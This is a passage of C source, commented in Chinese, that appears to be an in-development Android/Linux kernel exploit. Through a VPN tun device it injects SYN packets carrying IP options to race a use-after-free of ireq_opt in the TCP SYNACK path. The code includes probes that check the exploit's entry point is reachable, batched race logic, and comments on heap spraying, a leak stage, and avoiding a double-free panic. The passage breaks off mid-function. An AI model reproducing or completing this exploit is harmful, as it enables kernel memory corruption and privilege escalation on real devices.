static void snmp_report(const struct snmp_snap *before, const struct snmp_snap *after) {
    if (!before->valid || !after->valid) {
        say("[snmp] 读不到 /proc/net/snmp（Android 通常限制 untrusted_app），跳过这项证据");
        return;
    }
    long ir = (long)(after->in_receives - before->in_receives);
    long ih = (long)(after->in_hdr_errors - before->in_hdr_errors);
    long ts = (long)(after->tcp_in_segs - before->tcp_in_segs);
    long te = (long)(after->tcp_in_errs - before->tcp_in_errs);
    long tc = (long)(after->tcp_csum_errs - before->tcp_csum_errs);
    say("[snmp] Ip:InReceives %+ld  InHdrErrors %+ld", ir, ih);
    say("[snmp] Tcp:InSegs %+ld  InErrs %+ld  InCsumErrors %+ld", ts, te, tc);
    if (ih > 0) {
        say("[snmp] 结论：有包在 IP 头解析阶段就被丢了 —— IP 选项很可能不被接受");
    } else if (ts > 0) {
        say("[snmp] 结论：段进了 TCP 层，没收到 SYNACK 要往 TCP 处理/回包方向查");
    } else if (ir > 0) {
        say("[snmp] 结论：包进了 IP 层但没到 TCP —— 看是不是被路由/本地投递丢了");
    }
}

/* 打印包摘要表：synack=0 时唯一能告诉我们内核回了什么的东西。 */
static void dump_trace(void) {
    if (g_trace_n == 0) {
        say("[trace] 一个包都没回到 tun");
        return;
    }
    say("[trace] 从 tun 读到的前 %u 个包：", g_trace_n);
    for (unsigned i = 0; i < g_trace_n; i++) {
        const struct pkt_trace *t = &g_trace[i];
        const uint8_t *sa = (const uint8_t *)&t->saddr;
        const uint8_t *da = (const uint8_t *)&t->daddr;
        if (t->proto == 6) {
            say("[trace] %u.%u.%u.%u:%u → %u.%u.%u.%u:%u flags=%02x iplen=%u ipopt=%u",
                sa[0], sa[1], sa[2], sa[3], t->sport,
                da[0], da[1], da[2], da[3], t->dport,
                t->flags, t->iplen, t->optlen);
        } else if (t->proto == 1) {
            say("[trace] ICMP type=%u code=%u ptr=%u %u.%u.%u.%u → %u.%u.%u.%u",
                t->icmp_type, t->icmp_code, t->icmp_ptr,
                sa[0], sa[1], sa[2], sa[3], da[0], da[1], da[2], da[3]);
            if (t->icmp_type == 12) {
                say("[trace]   ↑ ICMP Parameter Problem：内核认为 IP 头第 %u 字节有问题", t->icmp_ptr);
            }
        } else {
            say("[trace] proto=%u %u.%u.%u.%u → %u.%u.%u.%u iplen=%u",
                t->proto, sa[0], sa[1], sa[2], sa[3],
                da[0], da[1], da[2], da[3], t->iplen);
        }
    }
}

/* 定义在后面：对照自检要用到它们。 */
static int syn_round(uint16_t *sport_out, uint32_t *seq_out, struct synack *out);
static void complete(uint16_t sport, uint32_t isn, uint32_t peer_seq);

/* 对照自检：同样的 SYN，不带 IP 选项再打一遍。
 *
 * 这是把「TCP 通道不通」和「IP 选项被内核拒绝」分开的最快办法：
 *   不带选项能拿到 SYNACK → 通道没问题，问题在选项本身（长度/类型/校验）；
 *   不带选项也拿不到     → 通道或监听没配对，先别管选项。
 */
/* 打 5 个 SYN，返回拿到 SYNACK 的个数。 */
static int try_syns(int n) {
    int got = 0;
    for (int i = 0; i < n; i++) {
        uint16_t sport;
        uint32_t isn;
        struct synack s;
        if (!syn_round(&sport, &isn, &s)) continue;
        got++;
        complete(sport, isn, s.seq);
    }
    return got;
}

/* 路由探针：SYNACK 发不出来，几乎可以肯定是 inet_csk_route_req 查不到路由。
 *
 * 它要查的是「到 10.7.7.99 的出口」，用监听 socket 所属网络的路由表。
 * Android 把 VPN 的路由放在独立表里（按 netId），如果我们的 socket 不在
 * VPN 网络上，就查不到 10.7.7.0/24，回落到默认路由 —— 而默认路由上的
 * 网卡没有 10.7.7.1 这个源地址，于是查表失败、SYNACK 静默丢弃。
 *
 * 这里用三种只读手段把"到底哪一步断了"问出来：
 *   ① 找出 10.7.7.1 挂在哪个网卡上（确认 tun 的接口名）
 *   ② UDP connect 到 10.7.7.99 —— 能成功说明路由存在，ENETUNREACH 说明没有
 *   ③ SO_BINDTODEVICE 到 tun —— 能设上就有救，回落到内核自己选路
 */
static char g_tun_if[IF_NAMESIZE];

static void probe_route(void) {
    g_tun_if[0] = '\0';

    /* ① 找 10.7.7.1 所在的接口。 */
    struct ifaddrs *ifa = NULL;
    if (getifaddrs(&ifa) == 0) {
        for (struct ifaddrs *p = ifa; p != NULL; p = p->ifa_next) {
            if (p->ifa_addr == NULL || p->ifa_addr->sa_family != AF_INET) continue;
            const struct sockaddr_in *sin = (const struct sockaddr_in *)p->ifa_addr;
            if (sin->sin_addr.s_addr == g_dst) {
                snprintf(g_tun_if, sizeof(g_tun_if), "%s", p->ifa_name);
                break;
            }
        }
        freeifaddrs(ifa);
    }
    if (g_tun_if[0] != '\0') {
        say("[route] 10.7.7.1 挂在网卡 %s 上", g_tun_if);
    } else {
        say("[route] 没找到挂着 10.7.7.1 的网卡（tun 地址没配上？）");
    }

    /* ② 到 10.7.7.99 的路由存不存在。 */
    int u = socket(AF_INET, SOCK_DGRAM, 0);
    if (u >= 0) {
        struct sockaddr_in d;
        memset(&d, 0, sizeof(d));
        d.sin_family = AF_INET;
        d.sin_port = htons(53);
        d.sin_addr.s_addr = g_src;
        int rc = connect(u, (struct sockaddr *)&d, sizeof(d));
        if (rc == 0) {
            struct sockaddr_in local;
            socklen_t ll = sizeof(local);
            getsockname(u, (struct sockaddr *)&local, &ll);
            const uint8_t *b = (const uint8_t *)&local.sin_addr.s_addr;
            say("[route] 到 10.7.7.99 有路由 ✅（内核选的本机源地址 %u.%u.%u.%u）",
                b[0], b[1], b[2], b[3]);
        } else {
            say("[route] 到 10.7.7.99 没有路由：errno=%d（%s）", errno, strerror(errno));
            say("[route] → SYNACK 就是卡在这一步：inet_csk_route_req 返回 NULL，静默不发包");
        }
        close(u);
    }

    /* ③ 能不能把 socket 钉到 tun 上。 */
    int t = socket(AF_INET, SOCK_STREAM, 0);
    if (t >= 0) {
        const char *dev = g_tun_if[0] ? g_tun_if : "tun0";
        int rc = setsockopt(t, SOL_SOCKET, SO_BINDTODEVICE, dev, (socklen_t)strlen(dev) + 1);
        if (rc == 0) {
            say("[route] SO_BINDTODEVICE(%s) 可用 ✅ —— 可以让监听 socket 直接走 tun", dev);
        } else {
            say("[route] SO_BINDTODEVICE(%s) 被拒 errno=%d（%s）", dev, errno, strerror(errno));
        }
        close(t);
    }
}

/* 决定性探针：用**本机 socket** 发一个带 40 字节 IP 选项的 SYN。
 *
 * 为什么这条最值得先做：它完全绕开 tun 的投递问题。setsockopt(IP_OPTIONS)
 * 让内核自己生成一个带选项的 SYN，走的正是 tcp_v4_save_options() 那条路
 * ——也就是漏洞的入口。连得上就证明"带选项的 SYN 能进请求队列"，
 * 连不上就说明这条路本身不通，不用再折腾 tun。
 *
 * 顺带把 connect 的错误码打出来：EINVAL/EOPNOTSUPP 通常是选项被拒，
 * ETIMEDOUT 是没回包，ECONNREFUSED 是监听没起来。
 */
static int probe_local_connect(void) {
    /* 监听 127.0.0.1 的临时端口：和 tun 无关，纯粹验选项。
     * 本应用进了 VPN 也不影响这条：VPN 只路由 10.7.7.0/24，loopback 不在其中。 */
    int ls = socket(AF_INET, SOCK_STREAM, 0);
    if (ls < 0) { say("[local] listener socket 失败 errno=%d", errno); return 1; }
    int one = 1;
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    a.sin_port = 0;
    if (bind(ls, (struct sockaddr *)&a, sizeof(a)) < 0 || listen(ls, 8) < 0) {
        say("[local] 监听 127.0.0.1 失败 errno=%d", errno);
        close(ls);
        return 1;
    }
    socklen_t alen = sizeof(a);
    getsockname(ls, (struct sockaddr *)&a, &alen);

    /* 对照 ①：不带选项。 */
    for (int round = 0; round < 2; round++) {
        int c = socket(AF_INET, SOCK_STREAM, 0);
        if (c < 0) { close(ls); return 1; }
        int rc = 0;
        if (round == 1) {
            uint8_t opts[OPT_MAXLEN];
            build_opts_kind(opts, OPT_MAXLEN, 0x4c4f4341u, OPT_KIND_RR);
            if (setsockopt(c, IPPROTO_IP, IP_OPTIONS, opts, OPT_MAXLEN) < 0) {
                say("[local] %s：setsockopt(IP_OPTIONS) 失败 errno=%d（%s）",
                    round == 0 ? "不带选项" : "带 40 字节 RR", errno, strerror(errno));
                close(c);
                continue;
            }
        }
        rc = connect(c, (struct sockaddr *)&a, sizeof(a));
        int err = errno;
        if (rc == 0) {
            say("[local] %s：connect 成功 ✅", round == 0 ? "不带选项" : "带 40 字节 RR");
        } else {
            say("[local] %s：connect 失败 errno=%d（%s）",
                round == 0 ? "不带选项" : "带 40 字节 RR", err, strerror(err));
        }
        close(c);
        if (round == 0 && rc != 0) {
            say("[local] 连不带选项都连不上，本机 TCP 栈有问题，后面不用测了");
            close(ls);
            return 1;
        }
        if (round == 1) {
            close(ls);
            if (rc == 0) {
                say("[local] 结论：内核接受带 40 字节 IP 选项的 SYN，漏洞入口可达 ✅");
                say("[local] → 问题在 tun 的投递/回包路径，不在选项本身");
                return 0;
            }
            say("[local] 结论：带选项的 SYN 被内核拒绝 —— 漏洞入口在本机不成立");
            return 2;
        }
    }
    close(ls);
    return 1;
}

/* 决定性探针：ICMP echo **带 40 字节 IP 选项**。
 *
 * 这是把「IP 选项在收包路径上被拒」和「TCP 特定问题」分开的唯一干净办法：
 *   带选项的 ICMP 能收到 reply → 内核接受带选项的入站包，问题在 TCP 层
 *   带选项的 ICMP 收不到    → IP 层就把带选项的包丢了，SYN 再试也没用
 *
 * 之所以用 ICMP 而不是 TCP：它不牵扯监听、端口、序列号，只走
 * ip_rcv → ip_rcv_options → icmp_rcv 这一条最短路径。
 */
static int probe_ipopt_icmp(void) {
    uint8_t pkt[192];
    unsigned long before = g_icmp_echo_reply;

    say("[opt-icmp] 发 3 个带 40 字节 NOP 选项的 ICMP echo");
    for (int i = 0; i < 3; i++) {
        size_t len = build_icmp_echo_ex(pkt, 40);
        tx(pkt, len);
        usleep(15 * 1000);
    }
    for (int i = 0; i < 40 && g_icmp_echo_reply == before; i++) usleep(10 * 1000);

    unsigned long got = g_icmp_echo_reply - before;
    if (got > 0) {
        say("[opt-icmp] 收到 %lu 个 ICMP 回包：内核接受带 IP 选项的入站包 ✅", got);
        say("[opt-icmp] → 问题不在 IP 层，往 TCP 处理/回包方向查");
        return 0;
    }
    say("[opt-icmp] 一个回包都没有：带 IP 选项的包在 IP 层就被丢了");
    if (g_icmp_param_prob > 0) {
        say("[opt-icmp] 期间收到 %lu 个 ICMP Parameter Problem，确认是选项被拒",
            g_icmp_param_prob);
    }
    say("[opt-icmp] → SYN 带选项这条路在本机不成立");
    return 1;
}

/* 闭端口探针：往一个**没有监听**的端口发 SYN，看有没有 RST 回到 tun。
 *
 * 这是判定"TCP 这条路通不通"最干净的一步，比看 SYNACK 更基础：
 *   收到 RST   → 包确实进了 TCP、内核也把回包路由回 tun，TCP 通道完全正常
 *   什么都没有 → TCP 层根本没处理这些包，问题在 IP 层或投递方向
 *
 * 之前 synack 恒为 0 时，raw_rx 有几个包但没有一个 SYNACK，光凭这个
 * 分不清"内核没回"和"回了别的"。这条探针一次就能定死。
 */
static int probe_closed_port(void) {
    int saved_len = g_optlen;
    enum opt_kind saved_kind = g_opt_kind;
    g_optlen = 0;                      /* 先不带选项，排除变量 */
    unsigned long rst_before = g_rst_seen;
    unsigned long tcp_before = g_tcp_other;

    uint16_t sport = (uint16_t)(40000 + (rand() % 20000));
    uint8_t pkt[128];

    /* 先挑一个**确认**没有监听者的端口：能 bind 上就说明是空的。 */
    uint16_t closed_port = 0;
    for (int i = 0; i < 20 && closed_port == 0; i++) {
        uint16_t cand = (uint16_t)(30000 + (rand() % 20000));
        if (cand == g_port) continue;   /* 别撞上自己的 listener */
        int t = socket(AF_INET, SOCK_STREAM, 0);
        if (t < 0) break;
        struct sockaddr_in a;
        memset(&a, 0, sizeof(a));
        a.sin_family = AF_INET;
        a.sin_port = htons(cand);
        a.sin_addr.s_addr = htonl(INADDR_ANY);
        if (bind(t, (struct sockaddr *)&a, sizeof(a)) == 0) closed_port = cand;
        close(t);
    }
    if (closed_port == 0) {
        say("[closed] 找不到空闲端口做对照，跳过");
        g_optlen = saved_len;
        g_opt_kind = saved_kind;
        return 1;
    }
    say("[closed] 往闭端口 %u 发一个 SYN（期望收到 RST）", (unsigned)closed_port);

    uint16_t saved_port = g_port;
    g_port = closed_port;
    size_t len = build_pkt(pkt, sport, 0x5a5a5a5a, 0, 0x02);
    g_port = saved_port;
    tx(pkt, len);

    for (int i = 0; i < 30 && g_rst_seen == rst_before; i++) usleep(10 * 1000);

    g_optlen = saved_len;
    g_opt_kind = saved_kind;

    if (g_rst_seen > rst_before) {
        say("[closed] 收到 RST：TCP 通道正常（包进了 TCP，回包也能回到 tun）");
        return 0;
    }
    say("[closed] 没有 RST（TCP 包共 %lu 个）：TCP 层没处理这些包",
        g_tcp_other - tcp_before);
    return 1;
}

/* 通道能力探测：决定"带选项的 SYN 到底能不能通"，并自动选一种能用的选项形态。
 *
 * 返回值：
 *   0  带选项的 SYN 能通（g_opt_kind / g_optlen 已改成能用的那一种）
 *   1  连不带选项都不通 —— 通道或监听的问题
 *   2  通道正常但任何 IP 选项都被拒 —— 这条入口在本机不成立
 *
 * 为什么要有它：之前 4000 轮里 synack 恒为 0，而"通道不通"和"选项被拒"
 * 两种原因都说得通，靠猜白烧了好几轮真机时间。现在用三次对照把它们分开，
 * 并且在 RR 不通、NOP 能通时自动降级 —— RR 只是用来携带标记，竞态本身
 * 不依赖它，换 NOP 一样能拿到 ireq_opt。
 */
static int control_no_options(void) {
    int saved_len = g_optlen;
    enum opt_kind saved_kind = g_opt_kind;
    struct snmp_snap sb, sa;

    /* ① 不带选项 —— 通道基线。 */
    g_optlen = 0;
    snmp_read(&sb);
    say("[ctrl] ① 不带 IP 选项：发 5 个 SYN");
    int base = try_syns(5);
    snmp_read(&sa);
    say("[ctrl] ① %d/5 拿到 SYNACK", base);
    snmp_report(&sb, &sa);
    if (base == 0) {
        g_optlen = saved_len;
        g_opt_kind = saved_kind;
        return 1;
    }

    /* ② 40 字节全 NOP —— 只测"能不能带选项"，不牵扯 RR 的指针语义。 */
    g_opt_kind = OPT_KIND_NOP;
    g_optlen = 40;
    snmp_read(&sb);
    say("[ctrl] ② 40 字节全 NOP 选项：发 5 个 SYN");
    int nop40 = try_syns(5);
    snmp_read(&sa);
    say("[ctrl] ② %d/5 拿到 SYNACK", nop40);
    snmp_report(&sb, &sa);

    /* ③ 原来的 RR 形态 —— 和 ② 对比就知道是不是 RR 本身的问题。 */
    g_opt_kind = OPT_KIND_RR;
    g_optlen = 40;
    say("[ctrl] ③ 40 字节 RR 选项（当前实现）：发 5 个 SYN");
    int rr40 = try_syns(5);
    say("[ctrl] ③ %d/5 拿到 SYNACK", rr40);

    if (rr40 > 0) {
        say("[OK] RR 选项能通，按原方案继续");
        g_opt_kind = OPT_KIND_RR;
        g_optlen = saved_len > 0 ? saved_len : 40;
        return 0;
    }
    if (nop40 > 0) {
        say("[!] RR 被拒、NOP 能通 —— 自动降级到 NOP 选项继续跑");
        say("[i] 代价：没有 4 字节标记，命中判定只看 optlen 是否偏离 40");
        g_opt_kind = OPT_KIND_NOP;
        g_optlen = 40;
        return 0;
    }

    /* ④ 短选项，排除"长度超阈值"这种解释。 */
    g_optlen = 4;
    say("[ctrl] ④ 4 字节 NOP 选项：发 3 个 SYN");
    int nop4 = try_syns(3);
    say("[ctrl] ④ %d/3 拿到 SYNACK", nop4);

    g_optlen = saved_len;
    g_opt_kind = saved_kind;
    if (nop4 > 0) {
        say("[!] 短选项能通、40 字节不通 —— 是长度问题，不是选项类型");
    } else {
        say("[!] 只要带 IP 选项就一个 SYNACK 都没有 —— 内核在 IP 层就丢了");
        say("[!] 这条路（SYN 带选项进 tcp_v4_save_options）在本机不成立");
    }
    return 2;
}

/* ------------------------------------------------------------ 监听端

 * 没有监听套接字，内核根本不会为这个端口建请求 sock：SYN 到达后直接回 RST，
 * tcp_v4_save_options() 不会被调用，ireq_opt 也就不存在。整条链的第一步
 * 是**真的在目标端口上 listen**，让内核走 tcp_conn_request 那条路。
 *
 * 端口选在 tun 子网的对端地址上：VpnService 已把 10.7.7.0/24 路由进 tun，
 * 绑定 10.7.7.1:g_port 之后，从 tun 投递进来的包会正常命中这个监听。
 */
static int g_listen_fd = -1;

/* 监听端探针：SYNACK 到底卡在哪一环。
 *
 * 现在已知：包进得了 TCP（闭端口回 RST），listener 也接住了（否则该回 RST），
 * 但 SYNACK 就是不出来。可能是
 *   ① listener 的路由域不对，inet_csk_route_req 返回 NULL，静默丢弃；
 *   ② listener 根本没收到 SYN（请求队列层面就没进去）。
 * 下面三样东西正好把这两者分开：
 *   · SO_MARK / SO_BINDTODEVICE —— 看 listener 有没有真的绑到 VPN 网络；
 *   · /proc/net/tcp 里有没有 SYN_RECV —— 有就说明请求 sock 建起来了；
 *   · 本进程 connect 一次自己 —— 能连上说明 listener 能完成握手。
 */
static void probe_listener_state(void) {
    char dev[IF_NAMESIZE];
    memset(dev, 0, sizeof(dev));
    socklen_t dl = sizeof(dev);
    if (getsockopt(g_listen_fd, SOL_SOCKET, SO_BINDTODEVICE, dev, &dl) == 0 && dl > 1) {
        say("[lprobe] listener 绑定网卡=%s", dev);
    } else {
        say("[lprobe] listener 没绑网卡");
    }

    int mark = 0;
    socklen_t ml = sizeof(mark);
    if (getsockopt(g_listen_fd, SOL_SOCKET, SO_MARK, &mark, &ml) == 0) {
        say("[lprobe] listener SO_MARK=%#x", (unsigned)mark);
    }

    int acc = 0;
    socklen_t al = sizeof(acc);
    if (getsockopt(g_listen_fd, SOL_SOCKET, SO_ACCEPTCONN, &acc, &al) == 0) {
        say("[lprobe] listener SO_ACCEPTCONN=%d（1=确实在 listen）", acc);
    }

    /* /proc/net/tcp 是判断「请求 sock 有没有建起来」的唯一直接证据。
     * 状态 0x0A=LISTEN、0x03=SYN_RECV、0x01=ESTABLISHED。 */
    FILE *f = fopen("/proc/net/tcp", "r");
    if (f == NULL) {
        say("[lprobe] 读不到 /proc/net/tcp（errno=%d）", errno);
    } else {
        char line[512];
        int shown = 0;
        if (fgets(line, sizeof(line), f) == NULL) { /* 表头 */ }
        while (fgets(line, sizeof(line), f) != NULL && shown < 8) {
            char local[80], rem[80];
            unsigned st = 0;
            if (sscanf(line, "%*s %79s %79s %x", local, rem, &st) != 3) continue;
            char *colon = strrchr(local, ':');
            if (colon == NULL) continue;
            unsigned lport = (unsigned)strtoul(colon + 1, NULL, 16);
            if (lport != (unsigned)g_port) continue;
            const char *name = "其他";
            switch (st) {
                case 0x01: name = "ESTABLISHED"; break;
                case 0x02: name = "SYN_SENT"; break;
                case 0x03: name = "SYN_RECV"; break;
                case 0x06: name = "TIME_WAIT"; break;
                case 0x0a: name = "LISTEN"; break;
                default: break;
            }
            say("[lprobe] /proc/net/tcp 端口 %u 状态 %s(%#x)", lport, name, st);
            shown++;
        }
        fclose(f);
        if (shown == 0) say("[lprobe] /proc/net/tcp 里没有端口 %u 的条目", g_port);
    }
}

/* 打几个 SYN，然后立刻看 listener 的 accept 队列有没有东西。
 *
 * 这是判断「SYN 到底进没进 listener 的请求队列」最直接的办法：
 *   · accept 拿到连接 → 握手完成，SYNACK 发出去并被回了 ACK；
 *   · accept 返回 EAGAIN → 没有完成的连接，但 SYN 可能停在 SYN_RECV；
 *   · 队列里连 SYN_RECV 都没有 → SYN 根本没到这个 socket。
 * 前两种都说明 listener 收到了包，第三种说明包在更早的地方就被丢了。
 */
static void probe_accept_queue(void) {
    uint16_t sport = (uint16_t)(30000 + (rand() % 20000));
    uint8_t pkt[128];
    int saved_len = g_optlen;
    g_optlen = 0;
    for (int i = 0; i < 3; i++) {
        size_t len = build_pkt(pkt, (uint16_t)(sport + i), 0x11223344 + i, 0, 0x02);
        tx(pkt, len);
        usleep(20 * 1000);
    }
    g_optlen = saved_len;

    /* 给内核一点时间建请求 sock / 完成握手。 */
    usleep(150 * 1000);

    int got = 0;
    for (int i = 0; i < 4; i++) {
        int c = accept(g_listen_fd, NULL, NULL);
        if (c < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) break;
            say("[aq] accept 失败 errno=%d（%s）", errno, strerror(errno));
            break;
        }
        got++;
        close(c);
    }
    if (got > 0) {
        g_synack += (unsigned long)got;
        say("[aq] accept 到 %d 个连接 ✅ —— SYN 进来了，SYNACK 也发出去了", got);
        say("[aq] → 通道完全正常，之前 0/5 是 syn_round 的匹配条件太严");
    } else {
        say("[aq] accept 队列空 —— 没有完成的连接");
        say("[aq] SYN 可能停在 SYN_RECV（SYNACK 发了但没回来），也可能根本没到");
        say("[aq] 结合 [lprobe] 的 /proc/net/tcp 状态判断是哪一种");
    }
}

/* 从本进程连一次自己的 listener：能连上说明握手能完成、SYNACK 发得出去。 */
static void probe_self_connect(void) {
    int c = socket(AF_INET, SOCK_STREAM, 0);
    if (c < 0) return;
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(c, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(g_port);
    a.sin_addr.s_addr = g_dst;
    int rc = connect(c, (struct sockaddr *)&a, sizeof(a));
    if (rc == 0) {
        say("[lprobe] 本进程 connect 自己 → 成功 ✅（listener 能完成握手）");
    } else {
        say("[lprobe] 本进程 connect 自己 → 失败 errno=%d（%s）", errno, strerror(errno));
        if (errno == ETIMEDOUT) {
            say("[lprobe] 超时 = SYN 发出去了但 SYNACK 没回来，选路/回包有问题");
        } else if (errno == ECONNREFUSED) {
            say("[lprobe] 被拒 = 没有 socket 在听这个地址端口");
        }
    }
    close(c);
}


static int listen_open(uint16_t port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        say("[listen] socket 失败 errno=%d", errno);
        return -1;
    }
    int one = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    /* 必须在 bind 之前钉网卡：bind 之后就决定了这个 socket 的路由域，
     * 之后再 SO_BINDTODEVICE 不会改变 SYNACK 的选路结果。 */
    if (g_tun_if[0] != '\0') {
        if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, g_tun_if,
                       (socklen_t)strlen(g_tun_if) + 1) == 0) {
            say("[listen] 已把监听 socket 钉到 %s", g_tun_if);
        }
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = g_dst;

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        int first = errno;
        /* 退路：绑 0.0.0.0。tun 地址刚配上时，绑定具体地址可能因为
         * 地址还没在表里而失败（EADDRNOTAVAIL）；通配绑定能接住任何
         * 目的地址的 SYN，对这条链完全够用 —— 我们只关心内核会不会
         * 为这个 SYN 建请求 sock。 */
        addr.sin_addr.s_addr = htonl(INADDR_ANY);
        if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            int second = errno;
            say("[listen] bind %u.%u.%u.%u:%u 失败 errno=%d（退到 0.0.0.0 也失败 errno=%d）",
                g_dst & 0xff, (g_dst >> 8) & 0xff, (g_dst >> 16) & 0xff,
                (g_dst >> 24) & 0xff, port, first, second);
            if (first == EADDRINUSE || second == EADDRINUSE) {
                say("[listen] 端口被占用 —— 多半是上一次运行的监听 socket 还活着");
                say("[listen] 该 socket 可能在 Kotlin 侧（heldListenerFd 未关）");
                say("[listen] 或者上一轮的子进程成了孤儿，仍在 listen");
            }
            close(fd);
            return -1;
        }
        say("[listen] 绑 %u.%u.%u.%u 失败（errno=%d），已退到 0.0.0.0:%u 监听",
            g_dst & 0xff, (g_dst >> 8) & 0xff, (g_dst >> 16) & 0xff,
            (g_dst >> 24) & 0xff, first, port);
    }
    if (listen(fd, 128) < 0) {
        say("[listen] listen 失败 errno=%d", errno);
        close(fd);
        return -1;
    }
    /* 非阻塞：accept 只在空闲时排空队列，不能把主流程卡住。 */
    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);
    /* 回读实际绑定的地址：绑定成功不等于绑到了你以为的那个地址。 */
    struct sockaddr_in bound;
    socklen_t blen = sizeof(bound);
    if (getsockname(fd, (struct sockaddr *)&bound, &blen) == 0) {
        const uint8_t *b = (const uint8_t *)&bound.sin_addr.s_addr;
        say("[listen] 实际监听 %u.%u.%u.%u:%u",
            b[0], b[1], b[2], b[3], ntohs(bound.sin_port));
    } else {
        say("[listen] 已在 %u.%u.%u.%u:%u 监听",
            g_dst & 0xff, (g_dst >> 8) & 0xff, (g_dst >> 16) & 0xff, (g_dst >> 24) & 0xff, port);
    }
    return fd;
}

/* 把已完成握手的连接取出来立刻关掉，免得队列堆满。
 * 只关心“内核有没有建请求 sock”，accept 到东西本身就是证据。 */
static int listen_drain(void) {
    if (g_listen_fd < 0) return 0;
    int n = 0;
    for (;;) {
        int c = accept(g_listen_fd, NULL, NULL);
        if (c < 0) break;
        close(c);
        n++;
    }
    return n;
}

/* ------------------------------------------------------------ 单次请求 */

/* 发一个 SYN，等它的 SYNACK；返回 1 拿到、0 没有。 */
static int syn_round(uint16_t *sport_out, uint32_t *seq_out, struct synack *out) {
    uint8_t pkt[128];
    uint16_t sport = (uint16_t)(20000 + (rand() % 40000));
    uint32_t isn = ((uint32_t)rand() << 16) ^ (uint32_t)rand();
    size_t len = build_pkt(pkt, sport, isn, 0, 0x02);
    tx(pkt, len);

    struct timespec t0;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (;;) {
        pthread_mutex_lock(&g_ring_lock);
        struct synack s;
        int got = pop(&s);
        pthread_mutex_unlock(&g_ring_lock);
        if (got) {
            if (s.peer == sport && s.ack == isn + 1) {
                *sport_out = sport;
                *seq_out = isn;
                *out = s;
                return 1;
            }
            g_mismatch++;
            if (g_mismatch <= 3) {
                say("[diag] 收到 SYNACK 但对不上：peer=%u(期望 %u) ack=%#x(期望 %#x) optlen=%u",
                    s.peer, sport, s.ack, isn + 1, s.optlen);
            }
        }
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        long ms = (now.tv_sec - t0.tv_sec) * 1000 + (now.tv_nsec - t0.tv_nsec) / 1000000;
        /* 60ms 足够本地 tun 往返；原来 200ms × 4000 轮 = 13 分钟，
         * 收不到包时看起来就是卡死。 */
        if (ms > 60) return 0;
        usleep(100);
    }
}

/* 完成握手：ACK；随后 RST 让子 socket 销毁、触发 kfree。 */
static void complete(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
    uint8_t pkt[128];
    size_t len = build_pkt(pkt, sport, isn + 1, peer_seq + 1, 0x10);
    tx(pkt, len);
    len = build_pkt(pkt, sport, isn + 1, peer_seq + 1, 0x04);
    tx(pkt, len);
}

/* 只发 ACK，不发 RST。
 *
 * leak 阶段不能用 [complete]：RST 会走 inet_sock_destruct，把子 socket 的
 * inet_opt 再 kfree 一次；如果那时它指向的已经是我们的喷射对象，就是一次
 * double free —— 这台机器 CONFIG_PANIC_ON_OOPS=y，直接重启。 */
__attribute__((unused)) static void complete_ack_only(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
    uint8_t pkt[128];
    size_t len = build_pkt(pkt, sport, isn + 1, peer_seq + 1, 0x10);
    tx(pkt, len);
}

/* 竞态的两半，必须落在不同 CPU 上：
 *
 *   读侧：重传 SYN → tcp_conn_request → tcp_v4_send_synack，在 RCU 临界区里
 *         取 req->ireq_opt 并一直用到 ip_options_build 的 memcpy；
 *   写侧：ACK 完成握手把 ireq_opt 交给子 socket 并置空，紧跟 RST 让子 socket
 *         走 inet_sock_destruct 把它 kfree 掉。
 *
 * 上游修复是把这两处 kfree 改成 kfree_rcu，正是承认“读者在 RCU 里、写者
 * 直接 kfree”这件事本身不成立 —— 所以只要 kfree 落在读侧 load 之后、memcpy
 * 之前，就是一次 UAF 读。 */
/* 批量竞态：同时跟踪 BATCH 个四元组，把串行的等待摊平成一次。
 *
 * 为什么能并行：每个四元组（sport, isn）在内核里各有一个独立的请求 sock，
 * 各自的 SYNACK 重传定时器互不干扰。串行做 300 轮要 300 次「等 1 秒」，
 * 并行做 20 个一批只要 20 次 —— 总时间从 6 分钟压到 20 秒出头。
 *
 * 流程（一批）：
 *   ① 给 BATCH 个四元组各发一个 SYN，收各自的 SYNACK，记下 isn 与 peer_seq；
 *   ② 等 880ms 让重传定时器全部就位（它们几乎同时启动，到期点也接近）；
 *   ③ 从 880ms 到 1120ms 每 1ms 给这 BATCH 个四元组各补一个 ACK，
 *      把定时器到期窗口扫一遍；
 *   ④ 收这一批回来的 SYNACK，检查长度是否偏离 40。
 *
 * 返回 1 = 命中（结果写进 out）；0 = 通道正常但没撞上；-1 = 一个 SYNACK 都没拿到。 */
#define RACE_BATCH 20
struct race_slot {
    uint16_t sport;
    uint32_t isn;
    uint32_t peer_seq;
};

static int race_batch(struct race_slot *slots, int want, struct synack *out) {
    int n = 0;
    for (int i = 0; i < want; i++) {
        uint16_t sport;
        uint32_t isn;
        struct synack s;
        if (!syn_round(&sport, &isn, &s)) continue;
        g_synack++;
        if (s.optlen == 0) {
            g_clear++;
            /* optlen=0 有两种来源，必须分开：
             *   · 首次 SYNACK 就为 0 —— 说明请求 sock 建起来时 ireq_opt
             *     已经是空的，和竞态无关（多半是喷淋的 socket 把端口占了，
             *     或者这个 SYN 根本没走到 tcp_v4_save_options）；
             *   · 竞态期间被清空 —— 那才是撞上了。
             * 打印前几条，看是不是集中在某一批。 */
            if (g_clear <= 6) {
